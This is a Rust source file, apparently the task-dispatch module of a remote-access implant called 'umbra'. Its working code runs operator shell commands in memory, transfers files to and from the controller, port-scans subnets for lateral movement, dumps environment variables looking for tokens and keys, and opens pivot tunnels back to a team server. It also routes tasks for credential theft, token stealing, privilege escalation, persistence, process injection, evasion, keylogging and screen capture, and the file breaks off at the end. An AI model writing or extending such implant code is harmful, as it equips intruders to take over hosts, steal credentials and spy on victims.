//! Task execution.
//!
//! All command execution is memory-only from the implant's point of view: the
//! command is handed to the platform shell through a pipe, its output is read
//! back into the process, and nothing is staged on disk (no temp scripts, no
//! dropped binaries). File transfer tasks only touch paths the operator names.

use std::io::{BufRead, Read};
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant};

use crate::sysinfo;
use crate::upk::{self, Value};

pub const MAX_OUTPUT: usize = 900 * 1024; // stay below the 1 MiB frame limit

/// The task kinds this implant can run.
///
/// The list travels in the handshake metadata: the server refuses to queue
/// work an agent cannot do, so the operator learns what a host is capable of
/// before the task is sent instead of after it failed.
///
/// Every alias the dispatcher understands is listed as well, because the
/// server matches the exact name that was asked for: an operator who writes
/// "cat" must not be told that the host cannot read a file.
pub fn capabilities() -> Vec<&'static str> {
    vec![
        "shell", "exec", "sysinfo", "recon", "pwd", "cwd", "ls", "tail", "hash",
        "download", "cat", "upload", "ps", "proc.kill", "sleep", "exit", "kill",
        "ping", "tunnel", "p2p", "bof", "ext", "inject", "creds", "token",
        "privesc", "persist", "unpersist", "persist.list", "persist.verify",
        "persist.migrate", "persist.health", "update", "registry", "screenshot",
        "clipboard", "keylog", "keylog.file", "triage", "find", "netinfo",
        "session.open", "session.input", "session.close", "vpn", "scan",
        "resolve", "env", "touch", "evade.report", "evade.posture",
        "evade.profile", "evade.shape", "evade.killswitch", "hygiene.memory",
        "hygiene.process",
    ]
}

pub struct Outcome {
    pub code: i64,
    pub out: Vec<u8>,
    pub err: String,
    /// Extra result fields (`total`, `eof`, `sha256`, ...). They are merged into
    /// the RESULT body, so the server and the operator can see transfer metadata
    /// without changing the message shape.
    pub extra: Vec<(&'static str, Value)>,
}

impl Outcome {
    pub fn ok(out: Vec<u8>) -> Self {
        Outcome { code: 0, out, err: String::new(), extra: Vec::new() }
    }
    pub fn err(code: i64, msg: impl Into<String>) -> Self {
        Outcome { code, out: Vec::new(), err: msg.into(), extra: Vec::new() }
    }
    /// Attach a metadata field to the result.
    pub fn with(mut self, key: &'static str, value: Value) -> Self {
        self.extra.push((key, value));
        self
    }
    pub fn to_value(&self, task_id: &str) -> Value {
        let mut fields = vec![
            ("id", upk::s(task_id)),
            ("code", upk::i(self.code)),
            ("out", upk::bin(&self.out)),
            ("err", upk::s(&self.err)),
        ];
        for (k, v) in &self.extra {
            fields.push((*k, v.clone()));
        }
        upk::map(fields)
    }
}

/// The result of a persistence task.
///
/// The report is what the operator reads; the entries are what the server
/// keeps, and the two counters are what turn a broken entry into an alert.
fn persistence(result: Result<crate::persist::Report, String>) -> Outcome {
    match result {
        Ok(report) => Outcome::ok(report.text.into_bytes())
            .with("persist", upk::arr(report.entries))
            .with("persist_total", upk::u(report.total))
            .with("persist_broken", upk::u(report.broken)),
        Err(e) => Outcome::err(1, e),
    }
}

/// An outcome with the extra fields of a report.
///
/// The evasion and the hygiene tasks return the fields they want the
/// server to keep; this is how they get into the result.
fn with_extra(outcome: Outcome, extra: Vec<(&'static str, Value)>) -> Outcome {
    let mut outcome = outcome;
    for (key, value) in extra {
        outcome = outcome.with(key, value);
    }
    outcome
}

fn shell_command(cmd: &str) -> Command {
    #[cfg(windows)]
    {
        let mut c = Command::new("cmd.exe");
        c.arg("/C").arg(cmd);
        c
    }
    #[cfg(not(windows))]
    {
        let mut c = Command::new("/bin/sh");
        c.arg("-c").arg(cmd);
        c
    }
}

/// Read a pipe to EOF but keep at most `MAX_OUTPUT` (+ a small slack) bytes.
///
/// Reading to EOF is not optional: a child that writes more than the pipe
/// buffer (~64 KiB) blocks inside `write()` and would never exit, so "wait for
/// exit, then read" deadlocks on exactly the commands operators care about
/// (`ps aux`, `ls -R`, `dmesg`).
fn drain<R: Read>(mut pipe: R) -> Vec<u8> {
    let mut kept = Vec::new();
    let mut chunk = [0u8; 8192];
    loop {
        match pipe.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                let room = (MAX_OUTPUT + 4096).saturating_sub(kept.len());
                if room > 0 {
                    kept.extend_from_slice(&chunk[..n.min(room)]);
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(_) => break,
        }
    }
    kept
}

fn truncate(mut v: Vec<u8>) -> Vec<u8> {
    if v.len() > MAX_OUTPUT {
        v.truncate(MAX_OUTPUT);
        v.extend_from_slice(b"\n[umbra: output truncated]\n");
    }
    v
}

/// Run a shell command with a hard timeout, capturing stdout+stderr.
///
/// Both pipes are drained by their own thread while the child runs; the main
/// thread only waits. Collecting the output afterwards is bounded, because a
/// background grandchild can keep a pipe open long after the child we spawned
/// has exited.
pub fn shell(cmd: &str, timeout_secs: u64) -> Outcome {
    if cmd.trim().is_empty() {
        return Outcome::err(1, "empty command");
    }
    let mut child = match shell_command(cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return Outcome::err(127, format!("spawn failed: {e}")),
    };

    let (tx, rx) = mpsc::channel::<(usize, Vec<u8>)>();
    if let Some(out) = child.stdout.take() {
        let tx = tx.clone();
        thread::spawn(move || {
            let _ = tx.send((0, drain(out)));
        });
    }
    if let Some(err) = child.stderr.take() {
        let tx = tx.clone();
        thread::spawn(move || {
            let _ = tx.send((1, drain(err)));
        });
    }
    drop(tx);

    let limit = timeout_secs.max(1);
    let deadline = Instant::now() + Duration::from_secs(limit);
    let timed_out = loop {
        match child.try_wait() {
            Ok(Some(_)) => break false,
            Ok(None) => {
                if Instant::now() > deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    break true;
                }
                thread::sleep(Duration::from_millis(20));
            }
            Err(e) => {
                let _ = child.kill();
                return Outcome::err(1, format!("wait failed: {e}"));
            }
        }
    };

    let collect_for = if timed_out { 200 } else { 2000 };
    let collect_until = Instant::now() + Duration::from_millis(collect_for);
    let mut parts: [Option<Vec<u8>>; 2] = [None, None];
    for _ in 0..2 {
        let left = collect_until.saturating_duration_since(Instant::now());
        if left.is_zero() {
            break;
        }
        match rx.recv_timeout(left) {
            Ok((which, buf)) => parts[which] = Some(buf),
            Err(_) => break,
        }
    }
    let mut out = parts[0].take().unwrap_or_default();
    if let Some(err) = parts[1].take() {
        out.extend_from_slice(&err);
    }

    if timed_out {
        // Partial output is still evidence: return what the command produced
        // before it was killed instead of throwing it away.
        return Outcome {
            code: 124,
            out: truncate(out),
            err: format!("command timed out after {limit}s"),
            extra: Vec::new(),
        };
    }

    let code = child.wait().ok().and_then(|s| s.code()).map(|c| c as i64).unwrap_or(0);
    Outcome { code, out: truncate(out), err: String::new(), extra: Vec::new() }
}

/// Read one chunk of a file.
///
/// A whole file rarely fits in a frame (1 MiB body, 900 KiB output budget), so
/// transfers are chunked: the caller asks for a byte range and gets it back with
/// `total`, `offset`, `eof` and a SHA-256 of *this chunk* in the result, which is
/// what makes a multi-request transfer verifiable instead of hopeful.
pub fn download(path: &str, offset: u64, limit: u64) -> Outcome {
    if path.is_empty() {
        return Outcome::err(1, "download requires args.path");
    }
    let limit = limit.clamp(1, MAX_OUTPUT as u64) as usize;
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) => return Outcome::err(1, format!("download {path}: {e}")),
    };
    if meta.is_dir() {
        return Outcome::err(1, format!("download {path}: is a directory"));
    }
    let total = meta.len();
    if offset > total {
        return Outcome::err(1, format!("download {path}: offset {offset} past end ({total})"));
    }
    let mut file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(e) => return Outcome::err(1, format!("download {path}: {e}")),
    };
    if offset > 0 {
        use std::io::Seek;
        if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)) {
            return Outcome::err(1, format!("download {path}: seek: {e}"));
        }
    }
    let mut buf = vec![0u8; limit];
    let mut read = 0usize;
    while read < buf.len() {
        match file.read(&mut buf[read..]) {
            Ok(0) => break,
            Ok(n) => read += n,
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(e) => return Outcome::err(1, format!("download {path}: {e}")),
        }
    }
    buf.truncate(read);
    let digest = crate::crypto::sha256(&buf);
    let eof = offset.saturating_add(read as u64) >= total;
    Outcome::ok(buf)
        .with("total", upk::u(total))
        .with("offset", upk::u(offset))
        .with("eof", upk::bool_(eof))
        .with("sha256", upk::s(&crate::config::hex_encode(&digest)))
}

/// Write one chunk of a file at `offset`.
///
/// The first chunk (`offset == 0`) truncates, later chunks are written at their
/// offset, so a retried transfer cannot leave a half-old file behind. On the
/// final chunk the result carries the SHA-256 of the whole file, which the
/// caller compares with the local hash.
pub fn upload(path: &str, offset: u64, data: &[u8], eof: bool) -> Outcome {
    if path.is_empty() {
        return Outcome::err(1, "upload requires args.path");
    }
    use std::io::{Seek, Write};
    let mut file = match std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(offset == 0)
        .open(path)
    {
        Ok(f) => f,
        Err(e) => return Outcome::err(1, format!("upload {path}: {e}")),
    };
    if offset > 0 {
        if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)) {
            return Outcome::err(1, format!("upload {path}: seek: {e}"));
        }
    }
    if let Err(e) = file.write_all(data) {
        return Outcome::err(1, format!("upload {path}: {e}"));
    }
    if let Err(e) = file.flush() {
        return Outcome::err(1, format!("upload {path}: flush: {e}"));
    }
    drop(file);

    let written = offset.saturating_add(data.len() as u64);
    let mut outcome = Outcome::ok(
        format!("wrote {} bytes at offset {offset} to {path}\n", data.len()).into_bytes(),
    )
    .with("written", upk::u(written))
    .with("eof", upk::bool_(eof));
    if eof {
        match std::fs::read(path) {
            Ok(whole) => {
                let digest = crate::crypto::sha256(&whole);
                outcome = outcome
                    .with("total", upk::u(whole.len() as u64))
                    .with("sha256", upk::s(&crate::config::hex_encode(&digest)));
            }
            Err(e) => return Outcome::err(1, format!("upload {path}: verify: {e}")),
        }
    }
    outcome
}

/// The context a task may need: the implant's identity and its C2 address.
///
/// Most tasks do not need it, but the ones that open a channel back to the
/// team server (a pivot callback, a peer link, the layer-3 tunnel) cannot
/// work without it.
#[derive(Clone)]
pub struct Context {
    /// The agent pre-shared key.
    pub psk: Vec<u8>,
    /// The implant identity.
    pub agent_id: String,
    /// The C2 address ("host:port").
    pub server: String,
    /// Whether the implant prints what it is doing.
    pub verbose: bool,
}

/// Read an argument that may arrive as text or as bytes.
///
/// The console sends a line of text, a script sends raw bytes, and the
/// implant does not care which one it got.
fn arg_bytes(args: &Value, key: &str) -> Vec<u8> {
    match args.get(key) {
        Some(Value::Bin(data)) => data.clone(),
        Some(Value::Str(text)) => text.as_bytes().to_vec(),
        _ => Vec::new(),
    }
}

/// Execute one task. `sleep`/`exit` are handled by the beacon loop itself, so
/// they are only reported here for completeness.
pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
    match kind {
        "shell" | "exec" => {
            let cmd = args.str_or("cmd", "");
            let timeout = args.u64_or("timeout", 120);
            shell(&cmd, timeout)
        }
        "sysinfo" => Outcome::ok(sysinfo::report().into_bytes()),
        "recon" => Outcome::ok(recon_report().into_bytes()),
        "pwd" | "cwd" => match std::env::current_dir() {
            Ok(p) => Outcome::ok(format!("{}\n", p.display()).into_bytes()),
            Err(e) => Outcome::err(1, format!("cwd: {e}")),
        },
        "ls" => {
            // The directory as the operator wants to see it: what it is,
            // who may touch it, how big it is and when it changed.
            let path = args.str_or("path", ".");
            let mut out = String::new();
            match std::fs::read_dir(&path) {
                Ok(entries) => {
                    let mut rows: Vec<(String, u64, String, String, String)> = Vec::new();
                    for entry in entries.flatten() {
                        let meta = entry.metadata().ok();
                        let kind = match meta {
                            Some(m) if m.is_dir() => "d",
                            _ => "-",
                        };
                        let size = meta.map(|m| m.len()).unwrap_or(0);
                        let modified = meta
                            .and_then(|m| m.modified().ok())
                            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                            .map(|d| crate::proc::format_ts(d.as_secs() as i64))
                            .unwrap_or_else(|| "-".to_string());
                        rows.push((
                            kind.to_string(),
                            size,
                            modified,
                            mode_of(&entry.path()),
                            entry.path().display().to_string(),
                        ));
                    }
                    rows.sort();
                    for (kind, size, modified, mode, name) in rows {
                        out.push_str(&format!(
                            "{kind} {mode} {size:>12} {modified} {name}\n"
                        ));
                    }
                    Outcome::ok(out.into_bytes())
                }
                Err(e) => Outcome::err(1, format!("ls {path}: {e}")),
            }
        }
        "tail" => {
            // The last lines of a file: what a log says right now.
            let path = args.str_or("path", "");
            let lines = args.u64_or("lines", 20) as usize;
            match std::fs::File::open(&path) {
                Ok(file) => {
                    let reader = std::io::BufReader::new(file);
                    let mut kept: std::collections::VecDeque<String> =
                        std::collections::VecDeque::new();
                    for line in reader.lines() {
                        let line = match line {
                            Ok(l) => l,
                            Err(_) => break,
                        };
                        if kept.len() >= lines {
                            kept.pop_front();
                        }
                        kept.push_back(line);
                    }
                    let mut out = String::new();
                    for line in kept {
                        out.push_str(&line);
                        out.push('\n');
                    }
                    Outcome::ok(out.into_bytes())
                }
                Err(e) => Outcome::err(1, format!("tail {path}: {e}")),
            }
        }
        "hash" => {
            // The digest of a file, so the operator can compare it with a
            // published one.
            let path = args.str_or("path", "");
            match std::fs::read(&path) {
                Ok(data) => {
                    let digest = crate::config::hex_encode(&crate::crypto::sha256(&data));
                    let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
                    Outcome::ok(format!("sha256 {digest} {size} {path}\n").into_bytes())
                }
                Err(e) => Outcome::err(1, format!("hash {path}: {e}")),
            }
        }
        "download" | "cat" => {
            let path = args.str_or("path", "");
            let offset = args.u64_or("offset", 0);
            let limit = args.u64_or("limit", MAX_OUTPUT as u64);
            download(&path, offset, limit)
        }
        "upload" => {
            let path = args.str_or("path", "");
            let data = args.bin_or("data", b"");
            let offset = args.u64_or("offset", 0);
            let eof = args.bool_or("eof", true);
            upload(&path, offset, &data, eof)
        }
        "ps" => match crate::proc::list() {
            Ok(text) => Outcome::ok(text.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },
        "proc.kill" => match crate::proc::kill(&args) {
            Ok(text) => Outcome::ok(text.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },
        "sleep" => Outcome::ok(b"sleep interval updated\n".to_vec()),
        "exit" | "kill" => Outcome::ok(b"beacon exiting\n".to_vec()),
        "ping" => Outcome::ok(b"pong\n".to_vec()),

        // ---- pivoting -------------------------------------------------
        "tunnel" => open_tunnel(ctx, args),
        "p2p" => peer_link(ctx, args),

        // ---- in-memory execution ---------------------------------------
        "bof" => run_module(args),
        "ext" => run_module(args),
        "inject" => inject(args),
        "creds" => match crate::post::creds(&args.str_or("mode", "")) {
            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },
        "token" => match crate::post::token(peer_pid(args)) {
            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },
        "privesc" => match crate::post::privesc(&args.str_or("mode", "")) {
            Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },

        // ---- persistence -------------------------------------------------
        //
        // The persistence manager owns the whole lifecycle: it installs a
        // technique, verifies that it is really there, lists what is on the
        // host, moves from one technique to another and takes everything away
        // again.  The entries travel with the result, so the server knows
        // what is installed on every host.
        "persist" => persistence(crate::persist::install(&args)),
        "unpersist" => persistence(crate::persist::remove(&args)),
        "persist.list" => persistence(crate::persist::list(&args)),
        "persist.verify" => persistence(crate::persist::verify(&args)),
        "persist.migrate" => persistence(crate::persist::migrate(&args)),
        "persist.health" => persistence(crate::persist::health(&args)),
        "evade.report" => {
            let (text, extra) = crate::evade::posture_report();
            with_extra(Outcome::ok(text.into_bytes()), extra)
        }
        "evade.posture" => match crate::evade::set_posture(&args) {
            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
            Err(e) => Outcome::err(1, e),
        },
        "evade.profile" => match crate::evade::set_profile(&args) {
            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
            Err(e) => Outcome::err(1, e),
        },
        "evade.shape" => match crate::evade::set_shaping(&args) {
            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
            Err(e) => Outcome::err(1, e),
        },
        "evade.killswitch" => match crate::evade::set_killswitch(&args) {
            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
            Err(e) => Outcome::err(1, e),
        },
        "hygiene.memory" => match crate::hygiene::memory(&args) {
            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
            Err(e) => Outcome::err(1, e),
        },
        "hygiene.process" => match crate::hygiene::process(&args) {
            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
            Err(e) => Outcome::err(1, e),
        },
        "update" => match crate::install::update(&args) {
            Ok(report) => Outcome::ok(report.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },

        // ---- the operator's own desktop ---------------------------------
        "registry" => match crate::registry::read(&args) {
            Ok(text) => Outcome::ok(text.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },
        "screenshot" => match crate::desktop::screen() {
            Ok(data) => Outcome::ok(data).with("format", upk::s("bmp")),
            Err(e) => Outcome::err(1, e),
        },
        "clipboard" => match crate::desktop::clipboard() {
            Ok(text) => Outcome::ok(text.into_bytes()),
            Err(e) => Outcome::err(1, e),
        },
        // The key logger is started by the beacon itself: it streams the
        // keys while it runs, exactly like an interactive session does.
        "keylog" => Outcome::err(2, "the key logger is started by the beacon itself"),
        "keylog.file" => {
            Outcome::err(2, "the key logger is started by the beacon itself")
        }

        // ---- files and the network --------------------------------------
        "triage" => {
            let path = args.str_or("path", "");
            match crate::triage::triage(&path) {
                Ok(out) => Outcome::ok(out.into_bytes()),
                Err(e) => Outcome::err(1, e),
            }
        }
        "find" => {
            let root = args.str_or("path", ".");
            let name = args.str_or("name", "");
            let content = args.str_or("content", "");
            let max = args.u64_or("max", 500) as usize;
            match crate::triage::find(&root, &name, &content, max) {
                Ok(out) => Outcome::ok(out.into_bytes()),
                Err(e) => Outcome::err(1, e),
            }
        }
        "netinfo" => Outcome::ok(crate::netinfo::report().into_bytes()),

        // ---- network reach and the local environment --------------------
        "scan" => {
            // Which hosts answer: the first step of a lateral move.
            let target = args.str_or("host", "");
            let ports = args.str_or("ports", "22,80,443");
            let timeout = args.u64_or("timeout_ms", 800).min(10_000);
            let max_hosts = args.u64_or("max_hosts", 256).min(4096) as usize;
            scan(&target, &ports, timeout, max_hosts)
        }
        "resolve" => {
            // Where a name points: the addresses, nothing else.
            let host = args.str_or("host", "");
            let port = args.u64_or("port", 0);
            resolve(&host, port)
        }
        "env" => {
            // The environment the implant runs in.  It often holds the
            // paths and the credentials the operator is looking for.
            let filter = args.str_or("filter", "");
            env_report(&filter)
        }
        "touch" => {
            // Create the file if it is missing and stamp it with the time.
            let path = args.str_or("path", "");
            touch(&path)
        }

        // ---- interactive sessions ---------------------------------------
        // `session.open` is handled by the beacon itself: the session has to
        // outlive the task that opened it, so the beacon keeps the stream
        // and sends the output as it arrives.
        // `session.open` is started by the beacon itself: the session has to
        // outlive the task that opened it.
        "session.open" => Outcome::err(2, "the session is started by the beacon itself"),
        "session.input" => {
            let id = args.str_or("session", "");
            match crate::sessions::input(&id, &arg_bytes(args, "data")) {
                Ok(()) => Outcome::ok(Vec::new()).with("session", upk::s(&id)),
                Err(e) => Outcome::err(1, e),
            }
        }
        "session.close" => {
            let id = args.str_or("session", "");
            match crate::sessions::close(&id) {
                Ok(()) => Outcome::ok(Vec::new()).with("session", upk::s(&id)),
                Err(e) => Outcome::err(1, e),
            }
        }

        // ---- layer-3 tunnel ---------------------------------------------
        "vpn" => start_vpn(ctx, args),

        other => Outcome::err(2, format!("unknown task kind {other:?}")),
    }
}

/// The reconnaissance report.
///
/// It is the host facts, the environment findings (a debugger, a sandbox) and
/// the domain edges, in that order: from "where am I" to "who else is here".
fn recon_report() -> String {
    let mut out = String::new();
    out.push_str(&sysinfo::report());
    out.push_str(&crate::evade::report());
    out.push_str(&crate::domain::report());
    out
}

/// Scan a range of hosts for open ports.
///
/// The scan is a plain TCP connect: the beacon opens a socket to every
/// address and reports the ones that answered.  No banner is read, so the
/// scan stays fast and does not poke at the services it finds.
fn scan(target: &str, ports: &str, timeout_ms: u64, max_hosts: usize) -> Outcome {
    if target.is_empty() {
        return Outcome::err(1, "scan requires args.host");
    }
    let hosts = match expand_target(target, max_hosts) {
        Ok(h) => h,
        Err(e) => return Outcome::err(1, e),
    };
    let port_list = match parse_ports(ports, 256) {
        Ok(p) => p,
        Err(e) => return Outcome::err(1, e),
    };
    let mut probes: Vec<(std::net::Ipv4Addr, u16)> =
        Vec::with_capacity(hosts.len() * port_list.len());
    for host in &hosts {
        for port in &port_list {
            probes.push((*host, *port));
        }
    }
    let total = probes.len();
    let timeout = Duration::from_millis(timeout_ms.max(1));
    let next = std::sync::atomic::AtomicUsize::new(0);
    let found: std::sync::Mutex<Vec<(std::net::Ipv4Addr, u16)>> = std::sync::Mutex::new(Vec::new());
    // A scan is a fan-out: a handful of threads keeps it quick without
    // opening hundreds of connections from one host at the same time.
    let workers = std::cmp::min(16, std::cmp::max(1, total));
    thread::scope(|scope| {
        for _ in 0..workers {
            scope.spawn(|| loop {
                let idx = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                if idx >= total {
                    break;
                }
                let (ip, port) = probes[idx];
                let addr = std::net::SocketAddr::new(std::net::IpAddr::V4(ip), port);
                if std::net::TcpStream::connect_timeout(&addr, timeout).is_ok() {
                    if let Ok(mut guard) = found.lock() {
                        guard.push((ip, port));
                    }
                }
            });
        }
    });
    let mut open = match found.lock() {
        Ok(guard) => guard.clone(),
        Err(_) => Vec::new(),
    };
    open.sort();
    let mut out = String::new();
    for (ip, port) in &open {
        out.push_str(&format!("{ip}:{port} open\n"));
    }
    out.push_str(&format!(
        "{} open of {} probes ({} hosts x {} ports)\n",
        open.len(),
        total,
        hosts.len(),
        port_list.len()
    ));
    Outcome::ok(out.into_bytes())
        .with("open", upk::u(open.len() as u64))
        .with("probes", upk::u(total as u64))
}

/// Expand a scan target into the addresses the scan walks.
///
/// The target is one IPv4 address or a CIDR block.  The expansion is done by
/// hand -- no dependency -- and the number of addresses is capped, so a /8
/// cannot turn into sixteen million connect attempts.
fn expand_target(target: &str, cap: usize) -> Result<Vec<std::net::Ipv4Addr>, String> {
    let (addr_part, bits_part) = match target.split_once('/') {
        Some((a, b)) => (a, Some(b)),
        None => (target, None),
    };
    let base = match addr_part.parse::<std::net::Ipv4Addr>() {
        Ok(ip) => u32::from(ip),
        Err(e) => return Err(format!("scan {addr_part}: {e}")),
    };
    let bits: u32 = match bits_part {
        Some(b) => match b.parse::<u32>() {
            Ok(v) if v <= 32 => v,
            Ok(_) => return Err(format!("scan {target}: the prefix length is out of range")),
            Err(e) => return Err(format!("scan {target}: {e}")),
        },
        None => 32,
    };
    let mask: u32 = if bits == 0 { 0 } else { u32::MAX << (32 - bits) };
    let network = base & mask;
    let total: u64 = 1u64 << (32 - bits);
    let count = std::cmp::min(total, std::cmp::max(1, cap) as u64) as usize;
    let mut out = Vec::with_capacity(count);
    for i in 0..count {
        out.push(std::net::Ipv4Addr::from(network.wrapping_add(i as u32)));
    }
    Ok(out)
}

/// Parse a port list: "80", "80,443" or "8000-8100".
fn parse_ports(spec: &str, cap: usize) -> Result<Vec<u16>, String> {
    let mut out: Vec<u16> = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some((lo, hi)) = part.split_once('-') {
            let low: u32 = match lo.trim().parse() {
                Ok(v) => v,
                Err(e) => return Err(format!("scan: bad port range {part}: {e}")),
            };
            let high: u32 = match hi.trim().parse() {
                Ok(v) => v,
                Err(e) => return Err(format!("scan: bad port range {part}: {e}")),
            };
            if high < low || high > 65535 {
                return Err(format!("scan: bad port range {part}"));
            }
            let mut port = low;
            while port <= high {
                out.push(port as u16);
                if out.len() >= cap {
                    return Ok(out);
                }
                port += 1;
            }
        } else {
            let port: u32 = match part.parse() {
                Ok(v) => v,
                Err(e) => return Err(format!("scan: bad port {part}: {e}")),
            };
            if port > 65535 {
                return Err(format!("scan: bad port {part}"));
            }
            out.push(port as u16);
        }
    }
    if out.is_empty() {
        return Err("scan: no ports".to_string());
    }
    out.truncate(cap);
    Ok(out)
}

/// Resolve a name into the addresses it points at.
///
/// The operator asks "where does this name live" before opening a connection
/// to it, so the answer is the address list and nothing else.
fn resolve(host: &str, port: u64) -> Outcome {
    use std::net::ToSocketAddrs;
    if host.is_empty() {
        return Outcome::err(1, "resolve requires args.host");
    }
    let port = port.min(65535) as u16;
    let addrs = match (host, port).to_socket_addrs() {
        Ok(a) => a,
        Err(e) => return Outcome::err(1, format!("resolve {host}: {e}")),
    };
    let mut out = String::new();
    let mut count = 0u64;
    for addr in addrs {
        if port == 0 {
            out.push_str(&format!("{}\n", addr.ip()));
        } else {
            out.push_str(&format!("{addr}\n"));
        }
        count += 1;
    }
    if count == 0 {
        return Outcome::err(1, format!("resolve {host}: no addresses"));
    }
    Outcome::ok(out.into_bytes()).with("count", upk::u(count))
}

/// The environment of the implant, sorted by name.
///
/// The filter keeps the interesting variables in reach: "PATH", "TOKEN",
/// "KEY" -- whatever the operator is hunting for.
fn env_report(filter: &str) -> Outcome {
    let needle = filter.to_lowercase();
    let mut vars: Vec<(String, String)> = std::env::vars().collect();
    vars.sort();
    let mut out = String::new();
    let mut count = 0u64;
    for (key, value) in vars {
        if !needle.is_empty() && !key.to_lowercase().contains(&needle) {
            continue;
        }
        out.push_str(&format!("{key}={value}\n"));
        count += 1;
    }
    Outcome::ok(out.into_bytes()).with("count", upk::u(count))
}

/// Create the file if it is missing and stamp it with the current time.
///
/// The contract is the one of the POSIX `touch`: the file exists afterwards
/// and its timestamps are "now".
fn touch(path: &str) -> Outcome {
    use std::fs::{FileTimes, OpenOptions};
    use std::time::SystemTime;
    if path.is_empty() {
        return Outcome::err(1, "touch requires args.path");
    }
    let existed = std::path::Path::new(path).exists();
    let file = match OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(false)
        .open(path)
    {
        Ok(f) => f,
        Err(e) => return Outcome::err(1, format!("touch {path}: {e}")),
    };
    let now = SystemTime::now();
    let times = FileTimes::new().set_accessed(now).set_modified(now);
    if let Err(e) = file.set_times(times) {
        return Outcome::err(1, format!("touch {path}: {e}"));
    }
    let size = file.metadata().map(|m| m.len()).unwrap_or(0);
    let verb = if existed { "touched" } else { "created" };
    Outcome::ok(format!("{verb} {path} ({size} bytes)\n").into_bytes()).with("size", upk::u(size))
}

/// The permission bits of a path, the way `ls -l` shows them.
#[cfg(unix)]
fn mode_of(path: &std::path::Path) -> String {
    use std::os::unix::fs::PermissionsExt;
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(_) => return "---------".to_string(),
    };
    let mode = meta.permissions().mode();
    // The nine bits of the mode, in the order `ls -l` shows them.
    let bits = [
        (0o400, 'r'), (0o200, 'w'), (0o100, 'x'),
        (0o040, 'r'), (0o020, 'w'), (0o010, 'x'),
        (0o004, 'r'), (0o002, 'w'), (0o001, 'x'),
    ];
    let mut out = String::new();
    for (bit, letter) in bits {
        out.push(if mode & bit != 0 { letter } else { '-' });
    }
    out
}

/// The permission bits of a path, the way `ls -l` shows them.
#[cfg(not(unix))]
fn mode_of(_path: &std::path::Path) -> String {
    "---------".to_string()
}

/// Open a pivot callback session.
///
/// The callback runs in the background: the beacon must keep beaconing while
/// the tunnel is open, so the task only reports that the session was started.
fn open_tunnel(ctx: &Context, args: &Value) -> Outcome {
    let stream = args.str_or("stream", "");
    if stream.is_empty() {
        return Outcome::err(1, "tunnel requires args.stream");
    }
    let context = ctx.clone();
    let id = stream.clone();
    thread::spawn(move || {
        loop {
            let result = crate::tunnel::open_callback(
                &context.server,
                &context.psk,
                &context.agent_id,
                &id,
                context.verbose,
            );
            match result {
                Ok(()) => {}
                Err(e) => {
                    if context.verbose {
                        eprintln!("[umbra] tunnel callback failed: {e}");
                    }
                }
            }
            // Back off before reconnecting: the server asked for this
            // session, so it is worth retrying, but not in a tight loop.
            thread::sleep(Duration::from_secs(15));
        }
    });
    Outcome::ok(format!("tunnel session {stream} opened\n").into_bytes())
        .with("stream", upk::s(&stream))
}

/// Open or listen for a peer-to-peer pivot link.
fn peer_link(ctx: &Context, args: &Value) -> Outcome {
    let action = args.str_or("action", "connect");
    let host = args.str_or("host", "");
    let port = args.u64_or("port", 0);
    let context = ctx.clone();
    match action.as_str() {
        "listen" => {
            let bind = if host.is_empty() {
                format!("0.0.0.0:{}", port)
            } else {
                format!("{host}:{port}")
            };
            thread::spawn(move || {
                if let Err(e) = crate::tunnel::listen_peer(
                    &bind,
                    &context.psk,
                    &context.agent_id,
                    context.verbose,
                ) {
                    if context.verbose {
                        eprintln!("[umbra] p2p listener failed: {e}");
                    }
                }
            });
            Outcome::ok(format!("p2p listener on {bind}\n").into_bytes())
                .with("bind", upk::s(&bind))
        }
        "connect" | "" => {
            if host.is_empty() || port == 0 {
                return Outcome::err(1, "p2p requires args.host and args.port");
            }
            thread::spawn(move || loop {
                let result = crate::tunnel::connect_peer(
                    &host,
                    port as u16,
                    &context.psk,
                    &context.agent_id,
                    context.verbose,
                );
                if context.verbose {
                    match result {
                        Ok(()) => {}
                        Err(e) => eprintln!("[umbra] p2p link failed: {e}"),
                    }
                }
                thread::sleep(Duration::from_secs(15));
            });
            Outcome::ok(format!("p2p link to {host}:{port} opened\n").into_bytes())
                .with("host", upk::s(&host))
                .with("port", upk::u(port))
        }
        other => Outcome::err(1, format!("unknown p2p action {other:?}")),
    }
}

/// Run a module in memory: a COFF object or a PE image.
